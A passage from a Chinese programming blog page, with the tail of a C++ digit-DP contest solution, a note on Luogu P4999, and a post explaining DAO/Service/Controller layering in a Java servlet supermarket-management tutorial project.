class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">20</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> dp[maxn][<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">10</span>;++j)&#123;</span><br><span class="line">        dp[<span class="number">1</span>][j]=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;maxn;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">10</span>;++j)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;<span class="number">10</span>;k++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">abs</span>(j-k)&gt;=<span class="number">2</span>)&#123;</span><br><span class="line">                    dp[i][j]+=dp[i<span class="number">-1</span>][k];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">solve</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> result=<span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> temp=n;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> dec[maxn];</span><br><span class="line">    <span class="built_in">memset</span>(dec,<span class="number">0</span>,<span class="built_in">sizeof</span>(dec));</span><br><span class="line">    <span class="type">int</span> len=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(temp)&#123;</span><br><span class="line">        dec[++len]=temp%<span class="number">10</span>;</span><br><span class="line">        temp/=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// cout&lt;&lt;&quot;actived&quot;&lt;&lt;endl;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=len<span class="number">-1</span>;++i)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">9</span>;++j)&#123;</span><br><span class="line">            result+=dp[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;dec[len];++j)&#123;</span><br><span class="line">        result+=dp[len][j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=len<span class="number">-1</span>;i&gt;=<span class="number">1</span>;--i)&#123;</span><br><span class="line">        <span class="comment">// cout&lt;&lt;&quot;in loop&quot;&lt;&lt;endl;</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=dec[i]<span class="number">-1</span>;++j)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">abs</span>(j-dec[i<span class="number">+1</span>])&gt;=<span class="number">2</span>)&#123;</span><br><span class="line">                result+=dp[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(dec[i]-dec[i<span class="number">+1</span>])&lt;<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> l,r;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;l&gt;&gt;r;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="comment">// cout&lt;&lt;solve(r+1)&lt;&lt;endl&lt;&lt;solve(l)&lt;&lt;endl;</span></span><br><span class="line">    cout&lt;&lt;<span class="built_in">solve</span>(r)-<span class="built_in">solve</span>(l<span class="number">-1</span>)&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="p4999-烦人的数学作业"><a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P4999">P4999
烦人的数学作业</a></h2>
<p>给定区间[l,r],求每个数各个十进制位的数字和</p>
<p>比如[123,125],就有1+2+3+1+2+4+1+2+5</p>
<p>首先问题转化为[1,n]区间上拆分数字和<a
target="_blank" rel="noopener" href="https://www.luogu.com.cn/problem/P1836">P1836 数页码</a></p>
<p>然后问题还可以转化为P2602求每个数字出现的次数</p>
<p>最终累计i×i的出现次数即可</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2023/01/04/MVC%E6%A1%86%E6%9E%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/01/04/MVC%E6%A1%86%E6%9E%B6/" class="post-title-link" itemprop="url">后端MVC框架</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-01-04 21:11:00" itemprop="dateCreated datePublished" datetime="2023-01-04T21:11:00+08:00">2023-01-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-09-14 00:02:57" itemprop="dateModified" datetime="2024-09-14T00:02:57+08:00">2024-09-14</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="后端mvc框架">后端MVC框架</h1>
<p>参考<a target="_blank" rel="noopener" href="https://gitee.com/subside_hh/SMBMS">SMBMS:
跟着狂神做超市订单管理系统 (gitee.com)</a></p>
<h2 id="mvc框架的使用时机">MVC框架的使用时机</h2>
<p>当需求分析结束后,数据库也已经建立完毕了.建立了四张数据表</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> use smbms;</span><br><span class="line">Database changed</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="operator">|</span> Tables_in_smbms <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="operator">|</span> smbms_bill      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> smbms_provider  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> smbms_role      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> smbms_user      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p>下面的任务就是写后端逻辑代码了,此时使用MVC框架建立项目</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/project1.png"
alt="project1" />
<figcaption aria-hidden="true">project1</figcaption>
</figure>
<h2 id="mvc框架是什么">MVC框架是什么</h2>
<p>整个后端在MVC框架中分了三层,DAO,Service,Controller</p>
<p><strong>DAO层:</strong>data access
object,数据访问层.每一个DAO类一定对应一个数据表,DAO类的函数,只做原子操作,CRUD</p>
<p>一个函数只实现一个功能,比如给定一个账单号,查库删除该账单</p>
<p>或者给定一个用户名和新密码,修改其密码.</p>
<p>可以理解为,DAO类的函数,一般只执行一条sql语句,一般只影响一行</p>
<p><strong>Service层:</strong>服务层.对Dao层的包装,一个Service层函数可能调用一个或者多个Dao层函数.返回pojo对象.</p>
<p>比如service上一个login(userCode,userPassword),首先会用userCode去查smbms_user表,然后用获取到的表项实例化一个user
pojo,然后user.getPassword和userPassword进行对比,相同则返回user对象,否则返回null指针</p>
<p><strong>Controller层:</strong>控制层,由Servlet实现,直接接收来自前端的get或者post请求,提取参数,决定使用哪种服务</p>
<table>
<colgroup>
<col style="width: 15%" />
<col style="width: 39%" />
<col style="width: 18%" />
<col style="width: 26%" />
</colgroup>
<thead>
<tr>
<th>层</th>
<th>输入</th>
<th>输出</th>
<th>任务</th>
</tr>
</thead>
<tbody>
<tr>
<td>Controller</td>
<td>request with parameters</td>
<td>respond</td>
<td>提取参数,决定服务</td>
</tr>
<tr>
<td>Service</td>
<td>raw parameters</td>
<td>pojo or else</td>
<td>执行事务,组合业务</td>
</tr>
<tr>
<td>DAO</td>
<td>connection,raw parameters</td>
<td>pojo or else</td>
<td>执行原子操作,CRUD</td>
</tr>
</tbody>
</table>
<p>画个图表示一下</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230104191129638.png"
alt="image-20230104191129638" />
<figcaption aria-hidden="true">image-20230104191129638</figcaption>
</figure>
<h2 id="mvc框架如何作用">MVC框架如何作用</h2>
<p>以登录逻辑为例,分析从前端请求到获得响应的整个过程</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230104184242886.png"
alt="image-20230104184242886" />
<figcaption aria-hidden="true">image-20230104184242886</figcaption>
</figure>
<h3 id="前端发起http请求">1.前端发起HTTP请求</h3>
<p>请求服务端你的login.do资源,携带两个get参数</p>
<p>目标DNS:localhost,会被本地hosts文件映射到IP:127.0.0.1</p>
<p>目标端口:8080</p>
<h3 id="该请求到达了服务端">2.该请求到达了服务端</h3>
<p>经过TCP/IP协议栈,将HTTP报文交给位于应用层的web服务器(tomcat)</p>
<h3 id="服务器首先查询web.xml">3.服务器首先查询web.xml</h3>
<p>找到login.do这路径应该映射给控制层的LoginServlet</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.threepure.servlet.user.LoginServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/login.do<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>至于tomcat具体怎么将HTTP请求报文交给LoginServlet的,目前不清楚,留作后话</p>
<p>可能手写一个玩具tomcat服务器就知道了,但不是现在</p>
</blockquote>
<p>于是将该get请求交给<code>LoginServlet.doGet(req,resp)</code></p>
<h3
id="调用控制层loginservlet.doget函数">4.调用控制层LoginServlet.doGet函数</h3>
<p>首先提取参数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">userCode</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;userCode&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">userPassword</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;userPassword&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>然后调用服务层,查询用户名密码是否正确</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">UserServiceImpl</span> <span class="variable">userService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserServiceImpl</span>();</span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userService.login(userCode, userPassword);</span><br></pre></td></tr></table></figure>
<p>这里user是一个pojo类型,其属性和user数据表的属性一一对应,一个user对象对应一条user表的记录</p>
<p>然后根据user是否为空,决定是否登陆成功</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (user!=<span class="literal">null</span>)&#123;<span class="comment">//user非空说明存在该用户且用户名密码正确</span></span><br><span class="line">    req.getSession().setAttribute(Constants.USER_SESSION, user);<span class="comment">//设置session</span></span><br><span class="line">    resp.sendRedirect(<span class="string">&quot;jsp/frame.jsp&quot;</span>);<span class="comment">//跳转登录之后的界面</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;<span class="comment">//要么不存在用户名,要么密码错误,反正登不上</span></span><br><span class="line">    req.setAttribute(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;用户名或者密码错误&quot;</span>);</span><br><span class="line">    req.getRequestDispatcher(<span class="string">&quot;login.jsp&quot;</span>).forward(req, resp);<span class="comment">//重新登录</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果有两个,</p>
<p>一个是设置session,保存用户登录状态,也就是设置了访问权限,此后过滤器会根据是否有session决定能否访问网站资源</p>
<p>一个是返回resp,设置页面重定向.实际上是返回了重定向的HTTP
respond报文</p>
<h3
id="调用服务层userservice.loginusercode-userpassword函数">5.调用服务层<code>userService.login(userCode, userPassword)</code>函数</h3>
<p>首先提升作用域,建立两个局部变量</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
<p>connection的建立和销毁都由本login函数决定,也就是资源的创建和销毁是Service服务层决定的</p>
<p>然后调用Dao层函数,根据<code>userDao.getLoginUser(connection, userCode)</code>查询是否存在用户</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    connection = DruidDao.getConnection();</span><br><span class="line">    user = userDao.getLoginUser(connection, userCode);</span><br><span class="line">&#125; <span class="keyword">catch</span> (SQLException throwables) &#123;</span><br><span class="line">    throwables.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    DruidDao.closeResource(<span class="literal">null</span>, <span class="literal">null</span>, connection);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查完了立刻在finally中释放资源</p>
<p>如果存在该用户,Dao层会返回一个user
pojo,和数据库中该用户的记录对应.</p>
<p>然后要判断用户密码是否正确,如果正确返回该pojo,控制层会使用该pojo执行其他业务.</p>
<p>如果密码错误或者user不存在,均会返回null,控制层发现该返回值为null就知道了用户名密码错误</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (user != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!user.getUserPassword().equals(password)) &#123;</span><br><span class="line">        user = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> user;</span><br></pre></td></tr></table></figure>
<h3
id="调用dao层userdao.getloginuserconnection-usercode函数">6.调用DAO层<code>userDao.getLoginUser(connection, userCode)</code>函数</h3>
<p>首先提升作用域,创建局部变量</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PreparedStatement</span> <span class="variable">pstm</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
<p>然后调用DAO公共底层DruidDao.execute函数,查库</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">       <span class="keyword">if</span> (connection != <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from smbms_user where userCode=?&quot;</span>;</span><br><span class="line">           Object[] params = &#123;userCode&#125;;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               rs = DruidDao.execute(connection, pstm, rs, sql, params);<span class="comment">//rs可能有多条</span></span><br><span class="line">               <span class="keyword">if</span> (rs.next()) &#123;<span class="comment">//最终user是rs的最后一条记录</span></span><br><span class="line">                   user = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">                   user.setId(rs.getInt(<span class="string">&quot;id&quot;</span>));<span class="comment">//使用rs记录实例化一个pojo</span></span><br><span class="line">                   user.setUserCode(rs.getString(<span class="string">&quot;userCode&quot;</span>));</span><br><span class="line">                   user.setUserName(rs.getString(<span class="string">&quot;userName&quot;</span>));</span><br><span class="line">                   user.setUserPassword(rs.getString(<span class="string">&quot;userPassword&quot;</span>));</span><br><span class="line">                   user.setGender(rs.getInt(<span class="string">&quot;gender&quot;</span>));</span><br><span class="line">                   user.setBirthday(rs.getDate(<span class="string">&quot;birthday&quot;</span>));</span><br><span class="line">                   user.setPhone(rs.getString(<span class="string">&quot;phone&quot;</span>));</span><br><span class="line">                   user.setAddress(rs.getString(<span class="string">&quot;address&quot;</span>));</span><br><span class="line">                   user.setUserRole(rs.getInt(<span class="string">&quot;userRole&quot;</span>));</span><br><span class="line">                   user.setCreatedBy(rs.getInt(<span class="string">&quot;createdBy&quot;</span>));</span><br><span class="line">                   user.setCreationDate(rs.getTimestamp(<span class="string">&quot;creationDate&quot;</span>));</span><br><span class="line">                   user.setModifyBy(rs.getInt(<span class="string">&quot;modifyBy&quot;</span>));</span><br><span class="line">                   user.setModifyDate(rs.getTimestamp(<span class="string">&quot;modifyDate&quot;</span>));</span><br><span class="line">               &#125;</span><br><span class="line">               DruidDao.closeResource(rs, pstm, connection);<span class="comment">//释放资源</span></span><br><span class="line">           &#125; <span class="keyword">catch</span> (SQLException throwables) &#123;</span><br><span class="line">               throwables.printStackTrace();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"><span class="keyword">return</span> user;</span><br></pre></td></tr></table></figure>
<h3
id="调用dao层公共函数druid.execute">7.调用DAO层公共函数Druid.execute</h3>
<p>CRUD根据读写性质分成两种,只读的查,和读写的增删改</p>
<p>并且只有查询要返回记录,其他的操作只需要返回几行受到影响即可</p>
<p>因此execute有两个重载,一个负责只读的查,一个负责读写的增删改</p>
<p>这里使用sql预编译,目的是提高速度</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>:编写查询公共方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ResultSet <span class="title function_">execute</span><span class="params">(Connection connection, PreparedStatement preparedStatement, ResultSet resultSet, String sql, Object[] params)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    preparedStatement = connection.prepareStatement(sql);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; params.length; i++) &#123;</span><br><span class="line">        <span class="comment">//setObject()占位符是从1开始，而数组是从0开始；</span></span><br><span class="line">        preparedStatement.setObject(i + <span class="number">1</span>, params[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;DruidDao&gt;&gt;查&gt;&gt;SQL :&quot;</span> + preparedStatement.toString());</span><br><span class="line">    resultSet = preparedStatement.executeQuery();</span><br><span class="line">    <span class="keyword">return</span> resultSet;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>:编写增删改公共方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">execute</span><span class="params">(Connection connection, PreparedStatement preparedStatement, String sql, Object[] params)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    preparedStatement = connection.prepareStatement(sql);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; params.length; i++) &#123;</span><br><span class="line">        <span class="comment">//setObject()占位符是从1开始，而数组是从0开始；</span></span><br><span class="line">        preparedStatement.setObject(i + <span class="number">1</span>, params[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;DruidDao&gt;&gt;增删改&gt;&gt;SQL :&quot;</span> + preparedStatement.toString());</span><br><span class="line">    <span class="keyword">return</span> preparedStatement.executeUpdate();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="mvc框架的建立过程">MVC框架的建立过程</h2>
<p>参考<a target="_blank" rel="noopener" href="https://gitee.com/subside_hh/SMBMS">SMBMS:
跟着狂神做超市订单管理系统 (gitee.com)</a></p>
<h3 id="准备工作">准备工作</h3>
<p>0.搭建服务器环境,使用tomcat服务器部署javaweb项目</p>
<p>1.建立pojo目录,在该目录下,给每个数据表建立一个一一对一个的pojo类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smbms/src/main/java/top/dustball/pojo/</span><br><span class="line">	User.java</span><br><span class="line">	Provider.java</span><br><span class="line">	Bill.java</span><br><span class="line">	Role.java</span><br></pre></td></tr></table></figure>
<p>2.建立Dao层公共底层类,实现execute函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbms/src/main/java/top/dustball/dao/</span><br><span class="line">	DaoBase.java</span><br></pre></td></tr></table></figure>
<p>3.引入资源,包括前端的jsp页面,js,css文件.数据库连接设置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbms/src/main/java/resources/</span><br><span class="line">	db.properties</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">smbms/src/main/webapp/</span><br><span class="line">	jsp/</span><br><span class="line">		...</span><br><span class="line">	js/</span><br><span class="line">		...</span><br><span class="line">	css/</span><br><span class="line">		...</span><br><span class="line">	images/</span><br><span class="line">		...</span><br><span class="line">	login.jsp</span><br><span class="line">	error.jsp</span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
<p>其中smbms/src/main/webapp/这下面的jsp,js,css,images等都是前端的工作.</p>
<p>前端和后端的接口是jsp和web.xml共同决定的,请求路径以及get或者post的参数名称</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">login.jsp</span><br><span class="line">&lt;form class=<span class="string">&quot;loginForm&quot;</span> action=<span class="string">&quot;$&#123;pageContext.request.contextPath &#125;/login.do&quot;</span>  name=<span class="string">&quot;actionForm&quot;</span> id=<span class="string">&quot;actionForm&quot;</span>  method=<span class="string">&quot;post&quot;</span> &gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">web.xml</span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.threepure.servlet.user.LoginServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/login.do<span 